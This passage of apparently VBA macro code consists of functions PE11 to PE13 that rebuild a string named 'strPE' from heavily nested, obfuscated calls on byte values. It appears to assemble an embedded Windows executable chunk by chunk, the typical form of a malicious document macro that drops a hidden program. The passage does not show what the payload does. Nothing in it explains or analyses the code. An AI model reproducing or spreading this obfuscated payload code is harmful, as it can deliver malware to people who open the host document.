    strPE = B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "x"), 193), "@"), 0), "3"), 196), 138), 30), 139), 0), 138), 4), "P"), 131), 224), 4), "3"), 142), ";Tt"), 13), 183), 190), 23), 141), 12), 137), 210), 211), "L"), 19), "9"), 235), 225), "b}"), 16), 199), "E"), 204), 1), 0), 0), 0), "&&"), 128), "?*")
    strPE = B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(strPE, 182), 30), 139), 3), 131), 195), 4), "G;"), 194), 137), "}"), 16), 199), "E"), 204), 1), 0), 0), 0), "}"), 5), 137), "?"), 192), 247), 216), 241), "E"), 224), 138), 3), 137), 188), 204), 130), "?"), 135), 247), 133), "r"), 0), "l"), 0), 161), "t"), 193), "@"), 0), "G")
    strPE = B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "'E"), 228), 1), 0), 0), 0), 137), "}"), 16), 131), "8"), 1), "~"), 20), "3"), 201), "j"), 144), 138), 15), "Q"), 255), 21), "h7@"), 0), 154), 196), 8), "3U"), 235), 18), "."), 13), 147), 193), "@"), 0), 167), 192), 138), 167), 139), 9), "b"), 4), "A")

    PE11 = strPE
End Function

Private Function PE12() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 131), 224), 4), 167), 194), "tO"), 15), 190), "*"), 131), 233), 177), "G"), 137), "}"), 16), 139), "c"), 145), 193), 194), 0), 137), "M"), 240), 131), ":"), 1), "~"), 21), "3"), 192), "jZ"), 138), 7), "PZ"), 21), "h"), 193), 222), 0), 139), "M"), 240), 131), 196), 8)
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 192), 17), 161), "x"), 193), 131), 0), "J"), 210), 138), 23), 139), 0), 164), 4), 167), 131), 224), 4), 133), 192), "t%"), 15), 190), 23), 141), "6"), 137), "G"), 141), "L"), 227), 208), 235), 187), 128), "e*u6"), 224), 3), 131), 189), 208), "G3"), 240), ";")
    strPE = A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "-"), 15), 156), "II"), 164), 200), 17), 222), 240), 137), "}"), 16), "j"), 202), "hT"), 244), "@"), 0), " "), 255), 128), "4"), 22), "@"), 228), 131), 196), 12), 133), 192), "t7"), 138), "|<qM"), 180), "3"), 192), 11), 175), "1"), 137), "U"), 240), 152), 219)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(strPE, 137), "U"), 204), 137), "#"), 228), 235), 211), "!lu"), 9), 184), 1), 31), 255), 0), "G"), 235), 24), "<hu"), 8), 160), 2), "0"), 0), 0), "G@"), 12), 184), 3), 0), "T"), 0), 235), 8), "3"), 192), 131), 199), 3), 137), "}"), 16), 139), "U"), 16)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 138), 10), 15), 190), 29), 131), 255), "x"), 15), 135), 135), 241), 0), 0), "3"), 210), 138), "N"), 4), "|@"), 0), 255), 220), 149), 165), "{@w"), 181), "Uu"), 34), 139), "K"), 240), 141), "U"), 252), 146), 3), 220), 141), "U"), 172), 131), "r"), 8), 137), 241)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(strPE, "U"), 208), "7jzQP"), 232), "r"), 13), 0), 0), 131), 196), 24), 235), "4"), 131), 248), 253), "t"), 16), 131), 144), 2), "u"), 11), 131), "?"), 4), 24), 192), 210), 139), "C"), 252), 235), 167), 139), 3), 131), 195), 4), 141), "M"), 141), 18), "U"), 172), "Q")
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(strPE, 141), "M"), 238), 140), "Q"), 157), 1), "P"), 137), "E"), 216), 232), "B"), 22), 0), 0), 131), 196), 20), 139), ")"), 139), "E"), 228), 161), 192), 15), 132), 187), 3), 0), 0), 139), "E"), 240), 141), "P"), 1), 203), 250), 0), "7"), 0), 0), "r"), 20), 184), 255), 171), "A")
    strPE = B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 0), "9E"), 21), 7), "["), 159), 187), 0), 0), "N"), 198), 210), "0"), 164), "M"), 252), "A;"), 200), 137), "M"), 252), "r"), 241), 233), 139), 3), 168), 0), 133), 228), "u"), 34), 139), "K"), 4), 141), "U"), 252), 139), 3), 135), 141), "e"), 172), 131), 195), 8), "r")
    strPE = A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 141), "U"), 208), "Rj|QP"), 232), 219), 12), 0), 0), 131), 196), 24), 235), "1"), 131), 173), 1), "t"), 13), 131), 248), "_u"), 212), 15), 191), 224), 131), 195), 4), 235), 5), 139), "8"), 131), 195), 4), 141), 223), 252), "3U"), 172), 210), 141), 217)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(strPE, 208), "RQj"), 221), "]"), 137), "E"), 216), 232), "H"), 12), "%"), 0), 229), 196), 20), 139), 240), 139), "E"), 16), 133), 192), "t'"), 139), "E"), 240), 141), "P"), 1), "Y"), 250), 0), 2), 0), 0), 189), 5), 184), 255), 235), 0), 195), "9E"), 252), "s"), 15)
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(strPE, "N"), 226), 6), "0"), 189), 180), 17), "A;"), 200), 137), "M"), 252), "r"), 241), 139), "E"), 138), 133), 249), 15), 132), 253), 1), 0), "<"), 230), "E"), 251), "-"), 233), 212), 2), "v"), 0), 133), 192), "u"), 31), 139), "S"), 4), 139), 3), "SuG"), 131), 195), 8)
    strPE = B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "V"), 141), "u"), 172), "VQj"), 3), "RP"), 163), 211), 16), 0), 0), 131), 196), 24), 22), "."), 131), 248), 1), "t"), 16), 131), 248), 2), "u"), 11), 131), 147), 218), "3"), 192), "f"), 139), "C"), 252), 136), 5), 139), 178), 131), "G"), 4), "AUuR")
    strPE = B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(strPE, 141), "U"), 188), "RQj"), 3), "P"), 232), "S5"), 0), 0), 211), 191), 20), 139), 240), 139), "E"), 228), 133), 5), "t'"), 139), "E"), 240), 141), "H"), 1), 5), 16), 0), 2), 0), 0), "r"), 5), 184), 255), 1), 0), 0), "9E"), 252), 134), 15), "N")
    strPE = A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 198), 11), "0"), 139), "M"), 252), "A;"), 200), 137), 183), 252), 196), 241), 139), "E"), 212), 133), 192), 15), 156), 17), "W"), 0), 0), 128), ">"), 13), 15), 18), "["), 2), 147), 0), "N"), 198), 6), 141), 30), "K"), 2), 0), 0), 133), ")2"), 31), 139), "S"), 4)
    strPE = A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(strPE, 247), 3), 141), "u"), 252), 131), 195), 8), "V"), 141), "u"), 172), "VQj"), 206), "RP"), 232), "5"), 16), "63"), 131), 196), 24), 235), "."), 131), 248), 1), "t"), 16), 131), 248), "tu"), 11), 131), 195), 4), "3"), 192), "f"), 202), "G"), 252), "sm"), 139)
    strPE = A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 3), 131), 195), 4), 141), "-"), 252), 203), 141), "U.RQ"), 195), 4), "'"), 232), 181), 206), 0), 0), 131), 196), 15), 139), "M"), 139), "$"), 228), 133), 192), 246), "'"), 210), "E"), 240), 141), "H"), 1), "\"), 249), 0), 2), 0), "cr"), 5), 184), 255), 1)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(strPE, 0), 227), "9E"), 252), "s"), 137), "N"), 198), 6), "D"), 139), "v"), 252), "A;"), 200), 137), "M"), 252), "ry"), 139), "E"), 212), "D"), 192), 15), 132), 198), 149), 213), 0), 241), 0), 216), 188), 192), 15), 132), 187), 1), 0), 248), 139), "U"), 16), "NN"), 138)
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(strPE, 2), 136), "F"), 1), 198), 30), "0"), 139), "E"), 252), 131), 15), 2), 233), 160), 1), 0), 0), 139), "3"), 131), 215), 255), 133), "$"), 15), 132), 200), 3), 0), 0), 139), "E"), 222), 226), 245), 177), 24), 139), 254), 144), 252), 255), "i"), 192), 168), "E"), 23), " "), 242)
    strPE = B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 174), 247), 209), "I"), 137), "M"), 252), 233), "w"), 1), 0), 182), 139), 196), 240), "3"), 210), 133), "+"), 22), 198), 137), "UI"), 15), 29), 163), 3), 0), 0), 128), "8"), 0), 15), 132), 202), 3), 0), 0), "-"), 152), ";n"), 137), "U"), 252), "r"), 238), 198), "E")
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 23), 201), "5S"), 1), 0), 0), 221), 3), 139), "E"), 228), 131), 195), 8), 221), "]"), 180), 133), 192), 184), 217), 0), 0), 198), "tfyE"), 1), 141), "U"), 252), "R"), 22), 149), 173), 253), 255), 255), "$"), 141), 219), 208), "R"), 139), "U"), 184), "P"), 175)
    strPE = A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "E"), 212), "~"), 210), "E"), 180), "RPQI"), 162), 6), 0), 0), 139), 240), 139), "E"), 208), 131), 196), " "), 142), 192), 133), 9), 198), "E"), 251), "-"), 229), 177), 0), 0), 0), 139), "E"), 196), 133), 192), "t"), 211), 198), "Ex+"), 233), 208), 0), 0)
    strPE = B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 139), "}"), 200), 133), 192), 15), 138), 1), 0), 0), 0), 198), "E"), 251), " "), 233), 188), 0), 0), 0), 139), "E"), 212), 133), "Fu"), 7), 184), 6), 0), 0), 0), 235), 12), 139), "E"), 240), "&"), 192), "e"), 214), 184), 1), 0), 0), 0), 16), "E=")
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 231), ")"), 212), 141), 149), 173), 253), 255), "y"), 221), 3), "Q"), 131), 184), 8), "R"), 149), 131), 16), 8), 196), 28), "$"), 232), 224), 5), "i"), 0), 195), 2), "("), 196), 20), 128), ">-u"), 7), 198), "EM-F"), 235), 24), 139), "E"), 196), 232), 192)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "tO"), 198), "E"), 251), "+"), 235), 11), "#B"), 200), "7"), 192), "t"), 175), 198), "E"), 251), " "), 139), 254), 131), 201), 255), "3"), 192), 242), 174), 139), "E"), 212), 255), 209), "I"), 133), 192), 137), "M"), 252), "t"), 131), "j.N"), 255), 21), "|"), 193), "@"), 0)
    strPE = A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(strPE, "}"), 196), 8), 133), 179), "$"), 18), 139), "E"), 252), 198), 4), "0."), 139), "E"), 164), "@"), 137), "E"), 252), 198), 4), "0"), 215), 139), "M"), 16), 154), "9G"), 184), 19), "j)d"), 255), 21), "|"), 133), "q"), 0), 131), 196), 8), 133), 212), "t"), 3), 198)
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(strPE, 0), "E"), 138), "E"), 251), 132), 138), "t"), 28), "~"), 254), 160), 194), "@"), 0), "t"), 20), "sE"), 234), ";"), 240), "t"), 13), 138), "M"), 251), "N"), 136), 14), 139), "Ez@"), 137), "E"), 252), 139), "E"), 204), 166), 192), 15), 132), 1), 3), 183), 0), 12), "}")
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 192), 1), 15), 133), 247), 2), 0), 0), 139), "U"), 224), "9E"), 252), ";"), 208), 15), 134), 233), 2), 0), 0), 128), "}"), 205), "0"), 15), 133), 203), 2), 0), 0), 230), "E"), 251), 132), 192), 15), 132), 216), 2), 143), 0), 139), "E"), 244), 139), "}"), 12), "w")
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(strPE, 192), "t&;E"), 220), "r"), 25), "W"), 137), 7), 255), "UVS"), 196), 4), 133), 192), 15), 133), 140), 27), 0), 242), 139), "O'"), 139), 7), 137), "M"), 220), 138), 197), 218), 16), "m}"), 219), 244), 139), "U"), 226), 139), 210), "$BF_")
    strPE = A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "U"), 155), 139), 134), 252), "JI"), 137), "U"), 177), 137), "M"), 224), 247), "I"), 2), ";"), 0), 138), "1"), 131), 195), 4), 1), "U"), 234), 141), "u"), 234), 199), "E"), 234), 242), 0), 0), 0), 198), 179), 23), " "), 233), "b"), 255), 255), 255), 198), "E"), 218), 243), 251)
    strPE = A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "u"), 234), 199), 136), 252), 1), 0), 0), 0), 198), "E"), 169), " "), 233), 204), 255), 255), 255), 131), 195), 4), 133), 192), "u"), 24), 139), "Er"), 139), "K"), 252), 19), 185), 1), 199), "E"), 188), 0), "^"), 0), 0), 137), "Q"), 4), 233), 210), 255), ";"), 255), 221)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(strPE, 248), 249), "u"), 136), 139), "Sv"), 152), "E"), 236), 199), 190), 188), 0), 0), 0), 0), 137), 2), 233), 19), 255), 255), "q"), 131), 248), 2), "u"), 22), 139), "K"), 9), 144), 139), "U"), 21), 199), "E"), 188), 0), 255), 0), 0), "f"), 137), 17), 233), 248), 254), 255)
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "g"), 139), "C"), 252), 139), "M"), 236), 199), "E"), 188), 0), 0), 0), 175), 137), 8), 240), 228), 254), 255), 255), 139), "E"), 16), "@"), 8), 158), 16), 138), 170), 15), 190), 200), 131), 249), "t"), 15), 135), "c"), 1), 0), 0), "3"), 210), 138), 145), 164), "|w"), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(strPE, 255), "$"), 149), 128), "|@"), 0), "w"), 3), 141), "M"), 252), 131), 195), 4), 141), "U"), 172), "QRjxj"), 4), 161), 232), "Z"), 12), 0), 0), 131), "t"), 20), 139), 240), 198), 224), 2), " "), 233), 155), 254), 255), 255), 250), 222), "@"), 195), 4), 173)
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 157), 15), 132), 192), 0), 0), 0), "U"), 152), 252), 141), "U"), 3), "QR"), 237), "DQ"), 9), 0), 0), 139), "u"), 139), "E"), 228), 0), 196), "h&"), 192), 15), 163), 174), 192), 0), 182), 198), "E"), 240), 139), 159), 178), "_"), 193), 15), 131), 160), 244), 0)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 0), 137), 132), 252), 184), "E"), 23), 241), 233), "V"), 254), 160), 255), 131), 3), 131), 195), 4), 133), 192), "t"), 127), 141), "M"), 252), 141), "U"), 172), "QRP"), 232), 128), 8), 0), 0), 235), 14), 139), 3), 131), 195), 4), 133), 192), "tf"), 139), 16), "{")
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "o"), 172), 253), 255), 255), "h"), 255), 1), 0), 0), "Q"), 217), 232), 171), 13), 14), 0), 139), "n^"), 201), "j"), 237), 254), "3"), 192), 242), 174), 247), 209), "C"), 198), "E"), 23), "w"), 137), "M%"), 233), 6), 254), 255), "<"), 139), 144), 131), 195), 4), "A"), 192)
    strPE = A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(strPE, "t/"), 141), "M"), 252), 141), "U"), 172), "Q"), 159), "P"), 232), "P"), 9), 0), 219), 233), "jY"), 255), 255), 139), 3), 178), 195), 14), 199), 150), "t"), 6), 141), "M "), 141), "U"), 172), "QRP"), 144), "T"), 24), 0), 0), 233), "Ne"), 255), 255), 190)
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 160), 169), 215), 0), 199), 18), 252), 163), 215), 0), 167), 213), "E"), 23), 3), 233), 185), 253), 255), 255), 131), 195), 4), "<Bu"), 11), 139), "C6"), 133), 192), "t"), 22), 139), 0), 235), 28), "<"), 191), "uxqK"), 252), 133), 168), "t"), 7), 139)
    strPE = A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(strPE, 1), 139), "I"), 4), 235), 4), "3"), 192), "3"), 201), 141), "U"), 172), "<QP"), 232), 236), 222), 255), 255), 139), 240), 182), 201), 228), 139), 254), "3"), 192), 242), 174), 247), 209), 234), 198), "E"), 23), " "), 137), "M,"), 233), 215), 253), 255), 255), 190), "T"), 244)
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(strPE, "@"), 28), 176), "E"), 252), 8), 0), 0), "%"), 198), "E"), 251), 0), 131), " "), 4), 233), "T"), 253), 20), 255), 22), "E"), 234), 12), 136), "M"), 235), 141), "u"), 234), "G1"), 252), 2), 0), 190), 0), 198), "E"), 163), 202), 233), ":"), 147), 16), 255), 139), "}"), 12)
    strPE = A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(strPE, 233), "E>"), 133), 192), "t'"), 165), "E"), 220), "r"), 25), "W"), 137), 7), 255), "U"), 8), 131), 196), 4), 133), 192), 15), 133), 254), 0), 241), 0), 165), " <"), 139), "L"), 137), "M"), 220), 138), "b"), 23), 136), 16), 243), 137), "E"), 244), 139), "M"), 236), 139)
    strPE = A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(strPE, "U"), 252), 248), 137), "Mm"), 151), "M"), 224), "I;"), 202), 137), "M"), 224), 221), 192), 139), "E"), 188), "L"), 248), 1), "9E"), 244), "uQ"), 139), "}R"), 133), 209), 173), "C"), 133), 192), "t"), 168), 28), "E"), 220), "r'"), 139), "E"), 12), 139), "M"), 244)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "P"), 137), 8), 255), "U"), 8), 131), 196), 4), 133), 192), 15), 133), 9), 0), 9), 0), 139), "E"), 12), 139), 16), 139), "@"), 4), 137), "E"), 220), 227), "U"), 157), "J"), 194), 138), 29), 136), 148), "@"), 137), "Ea"), 139), "M"), 6), "AFO"), 137), "M"), 130)
    strPE = A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "u"), 189), 139), "M"), 204), 133), 201), "tX"), 139), "M"), 192), 133), 201), 141), "Q"), 188), "U"), 224), 139), "M"), 252), ";"), 209), "vG"), 133), 192), "t"), 190), ";E"), 220), "p "), 139), "}"), 12), 139), "E"), 244), "W"), 137), 7), 255), "U"), 8), 131), 196), 4)
    strPE = A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(strPE, ";"), 192), "uO"), 135), 15), 139), "W"), 158), 137), "M"), 244), 137), "Ug"), 139), 193), "f"), 136), 23), 136), 245), "@"), 137), "E"), 244), 139), "M"), 236), 139), "U}h"), 137), 229), 236), "ZM"), 246), "I;"), 202), 159), "M"), 249), "w"), 185), 255), "E"), 16)
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 139), "U"), 16), "="), 2), 132), 192), 15), 133), 136), 245), 255), 255), 139), "M"), 12), 139), "E"), 244), "_"), 137), 1), 139), "E"), 236), "^"), 193), 139), 229), "]]8"), 0), "_^"), 131), 200), 255), "["), 139), 229), "]"), 194), 161), 0), 144), 162), "{@"), 0)
    strPE = A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(B(strPE, "}x@"), 0), 149), "vX"), 0), 7), 252), "@"), 0), 141), "u@"), 240), "b"), 169), "@"), 0), "Tt@"), 0), 148), 220), "y"), 0), "f"), 25), "@"), 0), 251), "x"), 214), "|<v@"), 132), 189), "s@"), 0), 139), "z@"), 0), 0), 12)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 12), 12), 12), 12), 12), ">"), 12), 166), 12), 12), 205), 12), 171), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 175), "["), 12), 200), 12), 12), 12), 12), 12), 31), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 12), 135), "T")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(strPE, 12), "6"), 12), 12), 12), 12), 12), 12), 12), 12), 12), "z2"), 12), 12), 12), 12), 2), 12), 3), 12), 214), 12), "r"), 12), 12), 12), 203), 12), 12), 12), 12), 12), 233), 12), 12), 4), 12), 254), 12), 12), 12), 12), 12), 12), 12), "r"), 5), 6), 2)

    PE12 = strPE
End Function

Private Function PE13() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 2), 3), 12), 6), 12), 12), "6"), 12), 7), 8), 9), 12), 12), 10), 12), 11), 12), 12), 4), 141), "I"), 0), 162), "{@"), 0), 137), "y@"), 136), "&~@"), 0), "Dy@"), 0), 217), 216), "@"), 23), "-"), 202), "@"), 181), 31), "N"), 238), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 209), "y@"), 134), "s"), 210), "@"), 0), 0), 243), 8), 8), 8), 8), 8), 8), 8), "$"), 8), 8), 8), 8), 13), 8), 8), 8), 8), 8), 8), 8), 8), 8), 8), 228), 8), 8), 8), 8), 8), 8), 8), 8), 8), 228), 8), 8), 8), 8), "A"), 8)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 8), 8), 241), 8), 8), 8), 8), 8), "!"), 8), 8), 8), 8), 8), 167), 187), 8), 8), 161), 8), 8), 8), 8), 1), 2), 8), 8), 8), 2), 8), 8), 3), 8), 212), 8), 8), 211), "H"), 8), 8), 238), 2), 235), 173), 8), "D"), 8), 245), 8), 8)
    strPE = B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "b"), 8), 8), 8), "+"), 22), 8), 184), "cI"), 8), 8), 8), 8), 8), 8), 8), 5), 8), 8), 6), 8), 8), 200), "D"), 144), 144), 144), 135), 144), 144), 144), 216), 187), 236), 131), 233), "XV"), 141), "E"), 168), "W"), 139), "}&"), 141), "M"), 252), "(")
    strPE = A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(strPE, 139), "E"), 226), 141), "U"), 12), "Q"), 139), 214), 8), "R<"), 196), "Q"), 232), "{"), 1), 0), 0), 139), "M"), 252), 139), "U"), 20), 131), 196), 24), 255), "E"), 30), 198), 201), 139), 242), "t]"), 187), 187), "-"), 141), "r"), 1), 141), 216), "DS"), 133), 201), 165)
    strPE = A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(strPE, 15), 128), "<"), 1), "kE^hI"), 133), 201), 127), 244), 171), "}"), 152), 139), "]"), 12), 133), 219), 15), 140), 180), 0), 0), 0), 139), 203), "+"), 207), 131), 249), 4), 15), 143), 26), 0), 0), 0), 133), 192), 127), ";"), 128), "80"), 171), "i"), 198)
